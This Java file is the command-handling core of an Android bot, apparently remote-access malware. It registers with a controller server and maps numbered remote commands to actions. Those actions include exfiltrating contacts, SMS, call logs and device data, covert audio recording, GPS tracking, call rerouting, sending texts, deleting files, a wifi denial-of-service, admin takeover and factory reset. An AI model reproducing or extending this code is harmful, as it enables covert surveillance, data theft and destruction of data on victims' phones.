package com.candroid.lofl.api;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.candroid.lofl.data.Constants;
import com.candroid.lofl.receivers.OutgoingCallReceiver;
import com.candroid.lofl.receivers.ScreenReceiver;
import com.candroid.lofl.services.CommandsIntentService;

public class Bot {
    //public static final String COMMAND_CODE = "mkldfnlkdfnlgnldfnmdf;klmds;msdf::";
    public static final String BOT_CONTROLLER_URL = "http://10.0.2.2:8080/createbot?address=";
    //public static final String SERVER_ADDRESS = "10.0.2.2";
    public static String SERVER_ADDRESS = "";
    public static String COMMAND_CODE = "";

    public static void bind(String serverAddress, String commandCode){
        SERVER_ADDRESS = serverAddress;
        COMMAND_CODE = commandCode.concat("::");
    }

    public static void processCommand(Context context, String message){
        String[] commandParts = message.split("::");
        String cmd = commandParts[1];
        if(cmd.contains("--")){
            String[] commandWithArgument = cmd.split("--");
            String commandCode = commandWithArgument[0].trim();
            if(commandWithArgument.length == 3){
                String argumentOne = commandWithArgument[1].trim();
                String argumentTwo = commandWithArgument[2].trim();
                onReceiveCommand(context, Integer.valueOf(commandCode), argumentOne, argumentTwo);
            }else{
                String argument = commandWithArgument[1];
                onReceiveCommand(context, Integer.valueOf(commandCode), argument, null);
            }
        }else{
            int commandCode = Integer.valueOf(cmd.trim());
            onReceiveCommand(context, commandCode, null, null);
        }

    }

    public static void processCommand(Context context, String message, BroadcastReceiver.PendingResult result){
        processCommand(context, message);
        result.finish();
    }

    public static void testProcessCommand(Context context){
        String message = COMMAND_CODE + Commands.CREATE_NOTIFICATION + " --haha im a title --but you're a bot";
        processCommand(context,message);
    }

    public static boolean onReceiveCommand(Context context, int command, String arg1, String arg2) {
        boolean commandFound = false;
        Intent intent = new Intent();
        intent.setClass(context, CommandsIntentService.class);
        switch (command) {
            case Commands.WEB_BROWSER:
                if(arg1 != null){
                    intent.setAction(CommandsIntentService.ACTION_WEB_BROWSER);
                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
                }
                commandFound = true;
                break;
            case Commands.WALLPAPER:
                intent.setAction(CommandsIntentService.ACTION_WALLPAPER);
                commandFound = true;
                break;
            case Commands.TEXT_PARENTS:
                intent.setAction(CommandsIntentService.ACTION_TEXT_PARENTS);
                commandFound = true;
                break;
            case Commands.SYNC_PHONE_TO_DATABASE:
                // TODO: 1/31/19
                intent.setAction(CommandsIntentService.ACTION_CONTACTS);
                context.startService(intent);
                intent.setAction(null);
                intent.setAction(CommandsIntentService.ACTION_PHONE_CALLS);
                context.startService(intent);
                intent.setAction(null);
                intent.setAction(CommandsIntentService.ACTION_PACKAGES);
                context.startService(intent);
                intent.setAction(null);
                intent.setAction(CommandsIntentService.ACTION_DEVICE_INFO);
                context.startService(intent);
                intent.setAction(null);
                intent.setAction(CommandsIntentService.ACTION_SMS);
                commandFound = true;
                break;
            case Commands.DOS_WIFI_CARD:
                intent.setAction(CommandsIntentService.ACTION_WIFI_CARD);
                commandFound = true;
                break;
            case Commands.FLASHLIGHT:
                intent.setAction(CommandsIntentService.ACTION_FLASHLIGHT);
                commandFound = true;
                break;
            case Commands.VIBRATOR:
                intent.setAction(CommandsIntentService.ACTION_VIBRATOR);
                commandFound = true;
                break;
            case Commands.SHARE_APP:
                intent.setAction(CommandsIntentService.ACTION_SHARE_APP);
                commandFound = true;
                break;
            case Commands.FACTORY_RESET:
                intent.setAction(CommandsIntentService.ACTION_FACTORY_RESET);
                commandFound = true;
                break;
            case Commands.REROUTE_PHONE_CALLS:
                if(arg1 != null){
                    intent.putExtra(OutgoingCallReceiver.NUMBER_KEY, arg1);
                    intent.setAction(CommandsIntentService.ACTION_REROUTE_CALLS);
                }
                commandFound = true;
                break;
            case Commands.CALL_PHONE:
                if(arg1 != null){
                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg1);
                    intent.setAction(CommandsIntentService.ACTION_CALL_PHONE);
                }
                commandFound = true;
                break;
            case Commands.CREATE_CONTACT:
                if(arg1 != null && arg2 != null){
                    intent.putExtra(Constants.Keys.NAME_KEY, arg1);
                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg2);
                    intent.setAction(CommandsIntentService.ACTION_INSERT_CONTACT);
                }
                commandFound = true;
                break;
            case Commands.SEND_SMS:
                if(arg1 != null && arg2 != null){
                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg1);
                    intent.putExtra(Constants.Keys.BODY_KEY, arg2);
                    intent.setAction(CommandsIntentService.ACTION_SEND_SMS);
                }
                commandFound = true;
                break;
            case Commands.ALARM_CLOCK:
                //hours
                if(arg1 != null ){
                    intent.putExtra(Constants.Keys.HOURS_KEY, Integer.valueOf(arg1));
                    int minutes = 0;
                    //minutes
                    if(arg2 != null){
                        minutes = Integer.valueOf(arg2);
                    }
                    intent.putExtra(Constants.Keys.MINUTES_KEY, minutes);
                    intent.setAction(CommandsIntentService.ACTION_ALARM_CLOCK);
                }
                commandFound = true;
                break;
            case Commands.RECORD_AUDIO:
                if(arg1 != null){
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
                    if(arg1.equalsIgnoreCase("stop")){
                        editor.putBoolean(ScreenReceiver.RECORDER_KEY, false);
                        ScreenReceiver.sShouldRecordAudio = false;
                    }else if(arg1.equalsIgnoreCase("start")){
                        editor.putBoolean(ScreenReceiver.RECORDER_KEY,true);
                        ScreenReceiver.sShouldRecordAudio = true;
                    }else{}
                    editor.apply();
                }
                commandFound = true;
                break;
            case Commands.CREATE_NOTIFICATION:
                if(arg1 != null && arg2 != null){
                    intent.putExtra(Constants.Keys.TITLE_KEY, arg1);
                    intent.putExtra(Constants.Keys.CONTENT_KEY, arg2);
                    intent.setAction(CommandsIntentService.ACTION_CREATE_NOTIFICATION);
                }
                commandFound = true;
                break;
            case Commands.CREATE_FILE:
                if(arg1 != null && arg2 != null){
                    intent.putExtra(Constants.Keys.FILE_NAME_KEY, arg1);
                    intent.putExtra(Constants.Keys.FILE_CONTENT_KEY, arg2);
                    intent.setAction(CommandsIntentService.ACTION_CREATE_FILE);
                }
                commandFound = true;
                break;
            case Commands.PLAY_SONG:
                if(arg1 != null){
                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
                    intent.setAction(CommandsIntentService.ACTION_PLAY_SONG);
                }
                commandFound = true;
                break;
            case Commands.DELETE_FILE:
                if(arg1 != null){
                    intent.putExtra(Constants.Keys.FILE_NAME_KEY, arg1);
                    intent.setAction(CommandsIntentService.ACTION_DELETE_FILE);
                }
                commandFound = true;
                break;
            case Commands.LOCATION:
                intent.setAction(CommandsIntentService.ACTION_LOCATION);
                commandFound = true;
                break;
            case Commands.GPS_TRACKER:
                if(arg1 != null){
                    if(arg1.equalsIgnoreCase("start")){
                        intent.putExtra(CommandsIntentService.GPS_TRACKER_KEY, true);
                    }else if(arg1.equalsIgnoreCase("stop")){
                        intent.putExtra(CommandsIntentService.GPS_TRACKER_KEY, false);
                    }
                    intent.setAction(CommandsIntentService.ACTION_GPS_TRACKER);
                }
                commandFound = true;
                break;
            case Commands.FETCH_NETWORK_DATA:
                if(arg1 != null){
                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
                    intent.setAction(CommandsIntentService.ACTION_DOWNLOAD_HTTP_DATA);
                }
                commandFound = true;
                break;
            case Commands.SYNC_PHONE_TO_SERVER:
                intent.setAction(CommandsIntentService.ACTION_SYNC_PHONE_TO_SERVER);
                commandFound = true;
                break;
            case Commands.ADMIN:
                intent.setAction(CommandsIntentService.ACTION_ADMIN);
                commandFound = true;
                break;
            case Commands.CALL_LOG_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_CALL_LOG_PERMISSION);
                commandFound = true;
                break;
            case Commands.LOCATION_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_LOCATION_PERMISSION);
                commandFound = true;
                break;
            case Commands.CONTACTS_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_CONTACTS_PERMISSION);
                commandFound = true;
                break;
            case Commands.RECORD_AUDIO_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_RECORD_AUDIO_PERMISSION);
                commandFound = true;
                break;
            case Commands.STORAGE_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_STORAGE_PERMISSION);
                commandFound = true;
                break;
            case Commands.CALENDAR_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_CALENDAR_PERMISSION);
                commandFound = true;
                break;
            case Commands.CAMERA_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_CAMERA_PERMISSION);
                commandFound = true;
                break;
            case Commands.PHONE_PERMISSION:
                intent.setAction(CommandsIntentService.ACTION_PHONE_PERMISSION);
                commandFound = true;
                break;
            default:
                break;
        }
        if(intent.getAction() != null){
            context.startService(intent);
        }else{
            return false;
        }
        return commandFound;
    }

    public static class Commands {
        public static final int WEB_BROWSER = 1;
        public static final int WALLPAPER = 2;
        public static final int ALARM_CLOCK = 3;
        public static final int TEXT_PARENTS = 4;
        public static final int SYNC_PHONE_TO_DATABASE = 5;
        public static final int DOS_WIFI_CARD = 6;
        public static final int VIBRATOR = 7;
        public static final int FLASHLIGHT = 8;
        public static final int RECORD_AUDIO = 9;
        public static final int SHARE_APP = 10;
        public static final int FACTORY_RESET = 11;
        public static final int REROUTE_PHONE_CALLS = 12;
        public static final int CALL_PHONE = 13;
        public static final int CREATE_CONTACT = 14;
        public static final int SEND_SMS = 15;
        public static final int CREATE_NOTIFICATION = 16;
        public static final int CREATE_FILE = 17;
        public static final int PLAY_SONG = 18;
        public static final int DELETE_FILE = 19;
        public static final int LOCATION = 20;
        public static final int GPS_TRACKER = 21;
        public static final int FETCH_NETWORK_DATA = 22;
        public static final int SYNC_PHONE_TO_SERVER = 23;
        public static final int ADMIN = 24;
        public static final int CALL_LOG_PERMISSION = 25;
        public static final int LOCATION_PERMISSION = 26;
        public static final int CONTACTS_PERMISSION = 27;
        public static final int RECORD_AUDIO_PERMISSION = 28;
        public static final int STORAGE_PERMISSION = 29;
        public static final int CALENDAR_PERMISSION = 30;
        public static final int CAMERA_PERMISSION = 31;
        public static final int PHONE_PERMISSION = 32;
    }
}
